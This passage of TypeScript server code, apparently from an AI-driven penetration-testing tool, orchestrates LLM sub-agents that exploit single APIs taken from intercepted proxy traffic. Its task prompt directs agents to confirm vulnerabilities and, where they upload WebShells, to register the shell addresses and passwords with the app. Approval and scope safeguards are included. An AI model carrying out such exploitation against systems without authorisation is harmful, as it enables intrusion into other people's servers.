          const slot = typeof body.slot === 'number' && body.slot >= 0 && body.slot < ApiServer.MAX_PARALLEL ? body.slot : 0
          // 补全请求包：自动渗透（未显式传 reqRaw）时从流量详情拼接（id 为流量 id）——审批官需要完整报文判断
          if (!body.reqRaw && typeof body.id === 'number') {
            const d = this.analyzeMap.get(body.id)?.detail as { reqLine?: string; reqRawHeaders?: string[]; reqBody?: string } | undefined
            if (d) body.reqRaw = `${d.reqLine || ''}\n${(d.reqRawHeaders || []).join('\n')}\n\n${d.reqBody || ''}`
          }
          // 渗透前查重：从原始请求包提取目标（Host+路径）+ advice 提取渗透方式；同 API 同方式已渗透过/正在渗透 → 不重复执行
          // P0：targetKey 用 normalizeTargetKey 统一规范化（与发卡/成果写入格式一致）
          const rawT = (body.reqRaw || '').match(/^\S+\s+(\S+)\s+HTTP\/1\.[01]\r?\n(?:[^\r\n]*\r?\n)*?Host:\s*(\S+)/i)
          let targetKey = rawT ? normalizeTargetKey(`${rawT[2]}${rawT[1]}`) : ''
          // fallback：reqRaw 缺失时尝试从 advice 中的绝对 URL 提取目标
          if (!targetKey) {
            const absUrl = (body.advice || '').match(/https?:\/\/[^\s"'）)]+/)?.[0]
            if (absUrl) targetKey = normalizeTargetKey(absUrl)
          }
          const method = (body.advice || '').match(/可进行\s*(.+?)\s*渗透/)?.[1] || ''
          const penKey = targetKey ? `${targetKey}|${method}` : ''
          if (penKey && (this.penetratedKeys.has(penKey) || this.penetratingKeys.has(penKey))) {
            this.json(res, 200, { started: false, slot, reply: `该目标API渗透方式已进行过 不再重复渗透（${targetKey} ${method}）` })
            break
          }
          // ---- 渗透审批（审批 Agent + 规则硬拦截双保险）：禁止删库等破坏性/不可逆操作 ----
          const approve = await this.approvePenetration(targetKey || '', method, body.reqRaw || '', body.advice)
          if (!approve.allowed) {
            this.log('warn', `[渗透] ⛔ 被审批拦截: ${targetKey || '(目标未知)'} · ${method} — ${approve.reason}`)
            this.json(res, 200, { started: false, blocked: true, slot, reason: approve.reason, reply: `渗透被审批拦截：${approve.reason}` })
            break
          }
          const sess = this.analyzeSlots[slot]
          this.pendingAdviceSlots.delete(slot)  // 用户点渗透 → 卡片决策完成，由渗透接管该槽
          this.penetrating = true  // 渗透窗口：期间流量跳过子 Agent 审计（防循环）
          // 记录渗透目标（取消时写入全局情报：同 API 状态可见）+ 进行中 key（防并发双渗透）
          const pm2 = (body.advice || '').match(/可进行\s*(.+?)\s*渗透/)?.[1] || ''
          if (penKey) this.penetratingKeys.add(penKey)
          if (targetKey) {
            this.penetrateTargets.set(slot, `${targetKey} ${pm2}`)
            this.engine.setPenetrateTarget(targetKey)  // 代理层标记渗透目标 → 命中流量 self 跳过审计
          }
          // 进行中工作共享：持久情报标记"正在渗透 X"（其他子 Agent 可见，避免重复建议/重复盯同一目标；完成/取消后移除）
          const tkHost = targetKey ? targetKey.split(':')[0] : ''
          const tkPath = targetKey ? targetKey.replace(/^[^/]+/, '') : ''
          this.pushDigest({ kind: 'penetrating', host: tkHost || '', path: tkPath, data: `正在渗透（${pm2 || method}），由槽 ${slot} 执行`, persist: true })
          this.log('info', `[渗透] 槽${slot} 开始: ${targetKey || '(目标未知)'} · 方式: ${pm2 || method}`)
          // 异步执行：立即返回（前端不再同步等待 4 分钟），完成经 SSE 推送 penetrate-done 更新任务/沟通窗口
          this.json(res, 200, { started: true, slot })
          ;(async () => {
          try {
          // 任务包装：要求子 Agent 实际执行渗透；有成果时输出【VULNDOC】结构化漏洞文档（严格格式规范，禁止 markdown 围栏/路由前缀，原始请求/响应包必填）
          const digest = await this.digestPrompt()
          // 被动模式：点到为止——只证明漏洞存在性，不深入利用（提权/WebShell/批量数据/利用链）
          const depthNote = this.pentestMode === 'passive' ? '（被动模式：点到为止——只需证明该接口存在可利用漏洞即可（注入点确认/未授权访问确认/敏感信息可读），禁止深入利用：禁止提权、禁止上传 WebShell、禁止批量获取数据、禁止后续利用链。确认漏洞存在即结束）' : ''
          const task = `${digest}${body.advice}\n\n${depthNote}（渗透执行要求：这是对单个 API 的采纳式渗透——严格只针对原始请求包中这一个 URL（方法+完整路径+查询参数），只验证该接口是否存在漏洞；禁止访问同站点任何其他路径/接口/静态资源，禁止目录枚举、全站扫描、批量探测、交叉接口利用。若渗透过程中上传了 WebShell，必须立即用 POST http://localhost:8877/api/webshells 同步到应用，body={\"type\":\"godzilla|behinder|antSword\",\"script\":\"php|jsp|asp|aspx\",\"url\":\"完整 shell 地址\",\"password\":\"连接密码\",\"key\":\"密钥\",\"cryption\":\"xor|aes\"}（同步后应用自动写入 Neo4j 情报图供其他 Agent 复用）。验证充分、确认结果后立即结束（蜂群模式：验证完成后释放子 Agent 继续流量分析）。这是渗透执行任务，不是流量分析任务——禁止输出 {"vuln":...} 形式的 JSON 或任何 JSON 代码，全部用文字描述执行过程。忽略此前对话中的任何结论与判断，只依据本次提供的【全局情报】与原始请求包执行。开始前先检查【全局情报】：判定"已渗透过"必须同时满足三个条件——① Host 完全相同；② 完整 API 路径完全相同（包括文件名与查询参数，如 /WFManager/js/login.js?rev=200003 与 /WFManager/loginAction_doLogin.action 是不同路径；仅 /WFManager/ 前缀相同不算）；③ 渗透方式完全相同。三者都满足才回复"该目标API渗透方式已进行过 不再重复渗透"并停止；否则必须实际执行渗透验证，禁止回复"已进行过"；若确认存在可利用漏洞（有成果），在回复末尾输出以下结构的漏洞文档，格式必须严格遵守：\n【VULNDOC】\n标题：<只写漏洞名称本身，禁止带 URL 或路由前缀，错误示例"/api/login 未授权访问"，正确示例"未授权访问与凭据泄漏">\n危害等级：high|medium|low\n漏洞描述：<简要描述>\n复现步骤：<验证过程>\n修复建议：<修复方案>\n漏洞目标：<目标 URL（协议+Host+端口，如 http://127.0.0.1:8800，必填）>\n漏洞路由：<漏洞接口路径（如 /api/login，必填）>\n原始请求包：\n<触发该漏洞的完整原始 HTTP 请求报文，必填。从请求行开始逐行原样输出（GET /path HTTP/1.1\\nHost: ...\\n\\n<body>），禁止使用 markdown 代码块围栏（禁止 \`\`\` 字符）、禁止加引号包裹、禁止 JSON 转义，必须可直接复制重放>\n原始响应包：\n<对应的完整原始 HTTP 响应报文，必填。从状态行开始逐行原样输出（HTTP/1.1 200 OK\\nHeader: ...\\n\\n<body>），同样禁止 \`\`\` 与任何修饰字符>\n若未确认漏洞，只需输出执行过程说明，不要输出【VULNDOC】）`
          const reply = await this.runViaGateway(task, sess, (abort) => { this.penetrateChildren.set(slot, abort) })  // 渗透经本地 gateway 执行（取消 = WebSocket abort，参考 hermes-studio chat-run）
          this.penetrateChildren.delete(slot)
          this.penetrateTargets.delete(slot)  // 渗透正常完成：清除目标记录（取消记录只由 cancel 路径写入全局情报）
          if (targetKey) this.engine.clearPenetrateTarget(targetKey)  // 同步清除代理层渗透目标标记
          // 子 Agent 执行时判定"该目标API渗透方式已进行过 不再重复渗透"（渗透前查重 miss、但子 Agent 依据【全局情报】识别出已渗透过）：
          // 视为自动取消——不写漏洞库、释放槽位会话（子 Agent 继续流量分析）、SSE 通知前端移除后台任务条
          if (reply.includes('该目标API渗透方式已进行过')) {
            const skHost = targetKey ? targetKey.split(':')[0] : ''
            const skPath = targetKey ? targetKey.replace(/^[^/]+/, '') : ''
            this.pushDigest({ kind: 'penetrated', host: skHost, path: skPath, data: `${method} 已渗透过 自动跳过`, persist: true })
            this.removeDigest('penetrating', skHost, skPath)  // 移除进行中标记
            this.analyzeSlots[slot] = ''  // 释放槽位会话：下次分析新建干净会话，子 Agent 继续流量分析
            this.pushSse({ type: 'penetrate-done', slot, reply, vulnDoc: false, skipped: true })
          } else {
          // 解析 VULNDOC（core/vulndoc.ts 纯函数：兼容省略【VULNDOC】标记）→ 写入漏洞库 + 静默注入主 Agent 会话记忆
          const parsed = parseVulndoc(reply, body.reqRaw || '', body.resRaw || '')
          if (parsed) {
            const level = parsed.level
            const uri = parsed.uri
            this.log('ok', `[渗透] ✓ 确认漏洞(${level}) ${uri} · ${parsed.name}`)
            // 复现步骤写入利用信息（exploit）；desc 只含漏洞描述 + 修复建议（不重复）
            const v: Vuln = { id: ++this.vulnSeq, name: parsed.name, level, cvss: '', uri, desc: parsed.desc, exploit: parsed.exploit, status: 'pending', reqRaw: parsed.reqRaw, resRaw: parsed.resRaw, ts: Date.now() }
            this.vulns.push(v)
            this.saveVulns()
            // VULNDOC 成果入图（Agent 共享，host/path 从完整 uri 拆分）
            const { host: vh, path: vp } = this.splitVulnUri(uri)
            if (vh && vp) { this.graph.writeVuln({ name: v.name, level, desc: v.desc, host: vh, path: vp, exploit: v.exploit, color: HAE_LEVEL_COLOR[level] }).catch((e) => console.warn('[pentbox] 渗透成果入图失败:', String(e).slice(0, 100))); this.graph.confirmAnalysis(vh, vp, level).catch((e) => console.warn('[pentbox] 分析确认标记失败:', String(e).slice(0, 100))); this.broadcastGraphChange(`渗透确认漏洞(${level}) ${vh}${vp}: ${v.name}`) }
            // 渗透确认 → 对应流量条目标记 confirmed（前端轮询：疑似问号 → 确认 BUG ICON + 确认等级）
            if (typeof body.id === 'number') {
              const ast = this.analyzeMap.get(body.id)
              if (ast) { ast.confirmed = true; ast.confLevel = level }
            }
            // 渗透成果写入全局情报（子 Agent 共享：后续分析/渗透前可见，避免同 API 同方式重复渗透）
            if (uri) {
              const pm = (body.advice || '').match(/可进行\s*(.+?)\s*渗透/)?.[1] || ''
              // reqRaw 推导的规范 key（normalizeTargetKey 统一格式）优先记入——堵住 VULNDOC 漏洞路由不带 query 导致的 key 漂移
              if (targetKey) this.penetratedKeys.add(`${targetKey}|${pm}`)
              // 模型报告 uri 兜底（normalizeTargetKey 规范化，如 http://127.0.0.1:8800/api/login → 127.0.0.1:8800/api/login）
              const normUri = normalizeTargetKey(uri)
              if (normUri) this.penetratedKeys.add(`${normUri}|${pm}`)
              // 无 query 版本兜底（模型漏 query 时，同路径不同 query 仍视为已渗透）
              const uriNoQuery = normUri.split('?')[0]
              if (uriNoQuery) this.penetratedKeys.add(`${uriNoQuery}|${pm}`)
              // 全局情报（结构化持久条目 + 移除进行中标记）
              const resHost = normUri ? normUri.split(':')[0] : ''
              const resPath = normUri ? normUri.replace(/^[^/]+/, '') : ''
              this.pushDigest({ kind: 'penetrated', host: resHost, path: resPath, data: `${pm} 漏洞(${level}) ${v.name}`, persist: true })
              this.removeDigest('penetrating', resHost, resPath)
            }
            this.pushSse({ type: 'vuln-doc', vuln: { id: v.id, name: v.name, level: v.level, desc: v.desc, exploit: v.exploit, ts: v.ts } })
            // 静默注入主 Agent 会话（走 Bridge 通道，与主会话同一命名空间才算真正注入；mainChat=false 不回写指针；仅当主会话已存在时注入）
            if (this.chatSessionId) {
              this.bridgeAsk(`（记忆记录，无需回复与执行任何操作）已知漏洞档案：漏洞 ${v.id}：${v.name}（${level}）\n描述：${parsed.desc.slice(0, 300)}\n复现：${parsed.exploit.slice(0, 300)}`, this.chatSessionId, {}, false).catch(() => { /* 记忆注入失败不影响主流程 */ })
            }
          }
          this.pushSse({ type: 'penetrate-done', slot, reply, vulnDoc: !!parsed })  // 异步完成通知（前端更新任务/沟通窗口）
          if (!parsed) this.log('info', `[渗透] 槽${slot} 完成: ${targetKey || '(目标未知)'} · 未确认漏洞`)
          }
          } catch (e) {
            this.log('err', `[渗透] 槽${slot} 执行失败: ${(e as Error).message.slice(0, 120)}`)
            this.pushSse({ type: 'penetrate-done', slot, reply: `（渗透执行失败：${(e as Error).message}）`, vulnDoc: false })
          } finally {
            this.penetrating = false  // 结束渗透窗口（无论成败都恢复审计）
            if (penKey) this.penetratingKeys.delete(penKey)  // 释放进行中标记（防并发双渗透）
            if (targetKey) this.engine.clearPenetrateTarget(targetKey)  // 同步清除代理层渗透目标标记（成功路径已清，此处兜底）
            // 兜底移除"正在渗透"digest 条目（成果/跳过分支已移；失败/无成果时此处兜底）
            const fkHost = targetKey ? targetKey.split(':')[0] : ''
            const fkPath = targetKey ? targetKey.replace(/^[^/]+/, '') : ''
            this.removeDigest('penetrating', fkHost, fkPath)
          }
          })()
          break
        }
        // ---------------- 子 Agent 运行中引导（steer：注入运行中渗透/分析 turn，不打断） ----------------
        case '/api/penetrate/steer': {
          const body = JSON.parse(await this.readBody(req)) as { text: string; slot?: number }
          if (!body.text) throw new Error('text 缺失')
          const slot = typeof body.slot === 'number' && body.slot >= 0 && body.slot < ApiServer.MAX_PARALLEL ? body.slot : 0
          const sid = this.analyzeSlots[slot]
          await this.ensureBridge()
          if (!sid || !this.bridgeReady) { this.json(res, 200, { accepted: false, status: 'rejected' }); break }
          this.json(res, 200, await this.bridge.steer(sid, body.text, 'hermespentbox-analyzer'))  // 分析槽会话在审计员档案
          break
        }
        // ---------------- 取消渗透任务（杀对应子 Agent 进程） ----------------
        case '/api/penetrate/cancel': {
          const body = JSON.parse(await this.readBody(req)) as { slot?: number }
          const slot = typeof body.slot === 'number' ? body.slot : -1
          const target = this.penetrateTargets.get(slot)
          this.log('warn', `[渗透] 槽${slot} 已取消: ${target || '(目标未知)'}`)
          const child = this.penetrateChildren.get(slot)
          if (typeof child === 'function') {
            // gateway 模式：发 abort 信号（优雅停止，参考 hermes-studio chat-run）
            try { (child as () => void)() } catch { /* 已结束 */ }
          } else if (child) {
            try { child.kill() } catch { /* 已退出 */ }
          }
          if (child) this.penetrateChildren.delete(slot)
          // 取消同步到全局情报（后续子 Agent 可见该 API 渗透已被用户取消，不再重复提议/可结合成果判断）
          const ptarget = this.penetrateTargets.get(slot)
          if (ptarget) {
            // 移除进行中 key（ptarget 格式 `${targetKey} ${pm2}` → 重建 penKey）
            const pv = ptarget.split(' ')
            const pk = pv[0]
            const pkm = pv.slice(1).join(' ')
            if (pk) this.penetratingKeys.delete(`${pk}|${pkm}`)
            // 取消信号降权：结构化持久记录（后续子 Agent 可见该方向曾被取消，避免重复建议）
            const chHost = pk ? pk.split(':')[0] : ''
            const chPath = pk ? pk.replace(/^[^/]+/, '') : ''
            this.pushDigest({ kind: 'cancelled', host: chHost, path: chPath, data: `${pkm} 渗透被用户取消（中断）`, persist: true })
            this.removeDigest('penetrating', chHost, chPath)
            this.penetrateTargets.delete(slot)
          }
          this.pendingAdviceSlots.delete(slot)  // 取消卡片/任务 → 恢复该槽流量分析
          this.penetrating = false  // 取消即恢复流量审计（防 kill 后 close 未触发的极端情况）
          this.engine.clearAllPenetrateTargets()  // 取消：清除代理层所有渗透目标标记
          this.analyzeSlots[slot >= 0 && slot < ApiServer.MAX_PARALLEL ? slot : 0] = ''  // 释放槽位会话：下次分析新建干净会话，继续流量分析工作
          this.json(res, 200, { ok: true })
          break
        }
        // ---------------- 恢复子 Agent 流量分析（卡片被用户关闭/超时未渗透时，前端通知后端释放槽位） ----------------
        case '/api/advice/resume': {
          const body = JSON.parse(await this.readBody(req)) as { slot?: number }
          const slot = typeof body.slot === 'number' && body.slot >= 0 && body.slot < ApiServer.MAX_PARALLEL ? body.slot : -1
          if (slot >= 0) this.pendingAdviceSlots.delete(slot)
          this.json(res, 200, { ok: true })
          break
        }
        // ---------------- LLM 设为默认（写入 hermespentbox 档案 config.yaml：模型/端点/Key 全量，应用对话实际生效） ----------------
        case '/api/llms/set-default': {
          const body = JSON.parse(await this.readBody(req)) as { model?: string; provider?: string; baseUrl?: string; apiKey?: string }
          if (!body.model) throw new Error('model 缺失')
          const provider = body.provider === 'minimax' ? 'minimax-cn' : body.provider  // Hermes 官方 provider 名（minimax-cn）
          const cfg = (k: string, v: string) => new Promise<void>((resolve) => {
            const child = spawn(this.hermesCli, ['config', 'set', k, v], { env: this.hermesEnv, cwd: this.agentCwd, windowsHide: true })
            child.on('close', () => resolve())
          })
          await cfg('model.default', body.model)
          if (provider) await cfg('model.provider', provider)
          if (body.baseUrl) {
            // 端点写 .env 的 OPENAI_BASE_URL（Hermes OpenAI 兼容约定，本机即如此配置；config.yaml 的 model.base_url 会与内置端点冲突）
            const envPath = join(this.hermesHome, '.env')
            let env = existsSync(envPath) ? readFileSync(envPath, 'utf8') : ''
            const re = /^OPENAI_BASE_URL=.*$/m
            env = re.test(env) ? env.replace(re, `OPENAI_BASE_URL=${body.baseUrl}`) : env.trimEnd() + `\nOPENAI_BASE_URL=${body.baseUrl}\n`
            writeFileSync(envPath, env)
          }
          if (body.apiKey && provider) {
            // 真实 key 写档案 .env（config set 对 key 值脱敏，必须走 <PROVIDER>_API_KEY 环境变量）
            const keyName = `${provider.toUpperCase().replace(/[^A-Z0-9]/g, '_')}_API_KEY`
            const envPath = join(this.hermesHome, '.env')
            let env = existsSync(envPath) ? readFileSync(envPath, 'utf8') : ''
            const re = new RegExp(`^${keyName}=.*$`, 'm')
            env = re.test(env) ? env.replace(re, `${keyName}=${body.apiKey}`) : env.trimEnd() + `\n${keyName}=${body.apiKey}\n`
            writeFileSync(envPath, env)
          }
          // 清理 config.yaml 的 api_key/base_url 残留（key 与端点都走 .env；config set 写入的 key 会被脱敏成假值导致 401）
          const cfgPath = join(this.hermesHome, 'config.yaml')
          if (existsSync(cfgPath)) {
            const text = readFileSync(cfgPath, 'utf8')
            const clean = text.split(/\r?\n/).filter((l) => !/^\s*(api_key|base_url):/.test(l)).join('\n')
            if (clean !== text) writeFileSync(cfgPath, clean)
          }
          this.json(res, 200, { ok: true })
          break
        }
        // ---------------- LLM 直连对话（OpenAI 兼容；供 Agent 分析队列等内部消费） ----------------
        case '/api/llm/chat': {
          const body = JSON.parse(await this.readBody(req)) as { baseUrl?: string; apiKey?: string; model?: string; reasoning?: string; messages?: { role: string; content: string }[] }
          if (!body.baseUrl || !body.apiKey || !body.model || !body.messages?.length) throw new Error('baseUrl/apiKey/model/messages 缺失')
          const payload: Record<string, unknown> = { model: body.model, messages: body.messages, max_tokens: 1024 }
          if (body.reasoning) payload.reasoning_effort = body.reasoning
          const r = await fetch(`${body.baseUrl.replace(/\/+$/, '')}/chat/completions`, {
            method: 'POST',
            headers: { 'content-type': 'application/json', authorization: `Bearer ${body.apiKey}` },
            body: JSON.stringify(payload),
            signal: AbortSignal.timeout(60000),
          })
          const j = await r.json().catch(() => ({}))
          if (!r.ok) throw new Error(j.error?.message ?? j.error ?? `HTTP ${r.status}`)
          this.json(res, 200, { ok: true, content: j.choices?.[0]?.message?.content ?? '' })
          break
        }
        // ---------------- LLM 直连测试（纯 HTTP：验证用户配置的端点/Key/模型可用） ----------------
        case '/api/llm/test': {
          const body = JSON.parse(await this.readBody(req)) as { baseUrl?: string; apiKey?: string; model?: string }
          if (!body.baseUrl || !body.apiKey || !body.model) throw new Error('baseUrl/apiKey/model 缺失')
          const r = await fetch(`${body.baseUrl.replace(/\/+$/, '')}/chat/completions`, {
            method: 'POST',
            headers: { 'content-type': 'application/json', authorization: `Bearer ${body.apiKey}` },
            body: JSON.stringify({ model: body.model, messages: [{ role: 'user', content: 'ping' }], max_tokens: 4 }),
            signal: AbortSignal.timeout(15000),
          })
          const j = await r.json().catch(() => ({}))
          if (!r.ok) throw new Error(j.error?.message ?? j.error ?? `HTTP ${r.status}`)
          this.json(res, 200, { ok: true, model: j.model ?? body.model, usage: j.usage })
          break
        }
        default:
          if (url.pathname.startsWith('/api/flows/')) {
            const id = Number(url.pathname.split('/')[3])
            const f = this.flows.find((x) => x.id === id)
            if (!f) { this.json(res, 404, { error: 'not found' }); break }
            // 详情（MITM 全量报文）
            if (url.pathname.endsWith('/detail')) {
              const d = this.flowDetails.get(id)
              if (!d) { this.json(res, 404, { error: 'no detail (非 MITM 流量或无报文)' }); break }
              this.json(res, 200, { id, ...d })
              break
            }
            this.json(res, 200, f)
            break
          }
      }
    } catch (e) {
      this.json(res, 400, { error: e instanceof Error ? e.message : String(e) })
    }
  }
}
